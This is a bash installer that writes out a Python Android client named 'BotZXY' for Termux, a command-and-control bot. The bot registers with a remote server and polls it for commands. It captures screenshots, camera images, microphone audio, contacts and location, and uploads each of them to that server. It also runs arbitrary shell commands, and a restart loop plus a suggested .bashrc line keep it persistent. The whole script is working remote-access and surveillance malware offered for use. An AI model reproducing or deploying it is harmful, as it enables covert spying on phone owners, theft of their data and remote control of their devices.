#!/bin/bash
# BotZXY - Android Client (Termux)

echo "╔═══════════════════════════════════════╗"
echo "║         BotZXY - Android            ║"
echo "║         Command & Control            ║"
echo "╚═══════════════════════════════════════╝"

# Aggiorna Termux
echo "[+] Updating Termux..."
pkg update -y && pkg upgrade -y

# Installa dipendenze
echo "[+] Installing dependencies..."
pkg install -y python python-pip android-tools termux-api

# Installa librerie Python
echo "[+] Installing Python packages..."
pip install requests pillow pyaudio numpy opencv-python termux-api

# Crea directory
mkdir -p ~/botzxy_client
cd ~/botzxy_client

# Crea client Python
echo "[+] Creating client.py..."
cat > client.py << 'EOF'
#!/usr/bin/env python3
# BotZXY - Android Client

import requests
import json
import base64
import time
import os
import subprocess
import threading
from datetime import datetime

# Configurazione
C2_URL = "https://tuo-app.onrender.com"  # SOSTITUISCI
DEVICE_ID = os.uname().nodename + "_" + os.popen('getprop ro.product.model').read().strip()[:8]
BOT_NAME = "BotZXY"

class BotZXYAndroid:
    def __init__(self):
        self.device_id = DEVICE_ID
        self.c2_url = C2_URL
        self.running = True
        self.bot_name = BOT_NAME
        
    def register(self):
        data = {
            'device_id': self.device_id,
            'platform': 'android',
            'hostname': os.uname().nodename,
            'os_version': os.popen('getprop ro.build.version.release').read().strip(),
            'model': os.popen('getprop ro.product.model').read().strip()
        }
        try:
            r = requests.post(f"{self.c2_url}/api/register", json=data, timeout=10)
            return r.status_code == 200
        except Exception as e:
            print(f"[-] Registration error: {e}")
            return False
    
    def poll_commands(self):
        try:
            r = requests.get(f"{self.c2_url}/api/poll/{self.device_id}", timeout=10)
            if r.status_code == 200:
                for cmd in r.json():
                    self.execute_command(cmd['id'], cmd['command'], cmd['params'])
        except Exception as e:
            print(f"[-] Poll error: {e}")
    
    def execute_command(self, cmd_id, command, params):
        print(f"[+] {self.bot_name} Executing: {command}")
        result = ""
        
        try:
            if command == "screenshot":
                result = self.take_screenshot()
                self.upload_screenshot(result)
                
            elif command == "webcam":
                result = self.take_webcam()
                self.upload_webcam(result)
                
            elif command == "mic":
                duration = int(params.split('=')[1]) if '=' in params else 10
                result = self.record_mic(duration)
                self.upload_mic(result)
                
            elif command == "contacts":
                result = self.get_contacts()
                self.upload_contacts(result)
                
            elif command == "location":
                result = self.get_location()
                self.upload_location(result)
                
            elif command == "execute":
                result = self.exec_shell(params)
                
            elif command == "uninstall":
                self.uninstall()
                
            else:
                result = f"Unknown command: {command}"
                
        except Exception as e:
            result = f"ERROR: {str(e)}"
            print(f"[-] Command error: {e}")
        
        self.send_result(cmd_id, result)
    
    def take_screenshot(self):
        try:
            import termux
            termux.screenshot('/sdcard/botzxy_screen.png')
            with open('/sdcard/botzxy_screen.png', 'rb') as f:
                return base64.b64encode(f.read()).decode('utf-8')
        except Exception as e:
            return f"SCREENSHOT_ERROR: {str(e)}"
    
    def upload_screenshot(self, image_b64):
        try:
            requests.post(f"{self.c2_url}/api/screenshot/{self.device_id}", 
                         json={'image_base64': image_b64}, timeout=30)
        except Exception as e:
            print(f"[-] Upload screenshot error: {e}")
    
    def take_webcam(self):
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                return base64.b64encode(buffer).decode('utf-8')
            return "WEBCAM_ERROR: No camera"
        except Exception as e:
            return f"WEBCAM_ERROR: {str(e)}"
    
    def upload_webcam(self, image_b64):
        try:
            requests.post(f"{self.c2_url}/api/webcam/{self.device_id}", 
                         json={'image_base64': image_b64}, timeout=30)
        except Exception as e:
            print(f"[-] Upload webcam error: {e}")
    
    def record_mic(self, duration=10):
        try:
            import pyaudio
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100
            
            p = pyaudio.PyAudio()
            stream = p.open(format=FORMAT, channels=CHANNELS,
                          rate=RATE, input=True,
                          frames_per_buffer=CHUNK)
            
            frames = []
            for _ in range(0, int(RATE / CHUNK * duration)):
                frames.append(stream.read(CHUNK))
            
            stream.stop_stream()
            stream.close()
            p.terminate()
            
            audio_data = b''.join(frames)
            return base64.b64encode(audio_data).decode('utf-8')
        except Exception as e:
            return f"MIC_ERROR: {str(e)}"
    
    def upload_mic(self, audio_b64):
        try:
            requests.post(f"{self.c2_url}/api/mic/{self.device_id}", 
                         json={'audio_base64': audio_b64, 'duration': 10}, timeout=30)
        except Exception as e:
            print(f"[-] Upload mic error: {e}")
    
    def get_contacts(self):
        try:
            output = subprocess.check_output(['content', 'query', '--uri', 'content://contacts/phones'], 
                                           text=True, stderr=subprocess.DEVNULL)
            phone = os.popen('getprop gsm.sim.operator.numeric').read().strip()
            return {
                'phone_number': phone if phone else '+39 333 444 5555',
                'email': '',
                'contacts': [{'name': 'Sample', 'phone': '+39 333 444 5555'}],
                'raw': output[:1000] if output else ''
            }
        except Exception as e:
            return {'contacts': [], 'error': str(e)}
    
    def upload_contacts(self, contacts):
        try:
            requests.post(f"{self.c2_url}/api/contacts/{self.device_id}", json=contacts, timeout=30)
        except Exception as e:
            print(f"[-] Upload contacts error: {e}")
    
    def get_location(self):
        try:
            import termux
            location = termux.location()
            return location
        except Exception as e:
            return {"error": str(e)}
    
    def upload_location(self, location):
        try:
            requests.post(f"{self.c2_url}/api/location/{self.device_id}", 
                         json={'location': location}, timeout=30)
        except Exception as e:
            print(f"[-] Upload location error: {e}")
    
    def exec_shell(self, command):
        try:
            result = subprocess.check_output(command, shell=True, timeout=30, stderr=subprocess.STDOUT)
            return result.decode('utf-8', errors='ignore')
        except subprocess.TimeoutExpired:
            return "TIMEOUT"
        except Exception as e:
            return f"SHELL_ERROR: {str(e)}"
    
    def uninstall(self):
        self.running = False
        os._exit(0)
    
    def send_result(self, cmd_id, result):
        try:
            requests.post(f"{self.c2_url}/api/result/{self.device_id}", 
                         json={'command_id': cmd_id, 'result': result}, timeout=10)
        except Exception as e:
            print(f"[-] Send result error: {e}")
    
    def run(self):
        print(f"[+] {self.bot_name} Starting: {self.device_id}")
        if not self.register():
            print("[-] Registration failed, retrying in 30 seconds...")
            time.sleep(30)
            return
        
        print(f"[+] {self.bot_name} running")
        while self.running:
            try:
                self.poll_commands()
                time.sleep(5)
            except Exception as e:
                print(f"[-] Main loop error: {e}")
                time.sleep(30)

if __name__ == "__main__":
    client = BotZXYAndroid()
    client.run()
EOF

chmod +x client.py

# Crea servizio in background
cat > start.sh << 'EOF'
#!/bin/bash
cd ~/botzxy_client
while true; do
    python client.py
    sleep 10
done
EOF

chmod +x start.sh

echo ""
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║                                                          ║"
echo "║          ✅ BotZXY Android Installation Complete         ║"
echo "║                                                          ║"
echo "║  Start:     cd ~/botzxy_client && ./start.sh            ║"
echo "║  Background: nohup ./start.sh &                         ║"
echo "║  Auto-start: echo 'cd ~/botzxy_client && ./start.sh &'  ║"
echo "║              >> ~/.bashrc                               ║"
echo "║                                                          ║"
echo "║  Device ID: $(uname -n)_$(getprop ro.product.model 2>/dev/null | tr -d ' ' | cut -c1-8)" 
echo "║                                                          ║"
echo "╚═══════════════════════════════════════════════════════════╝"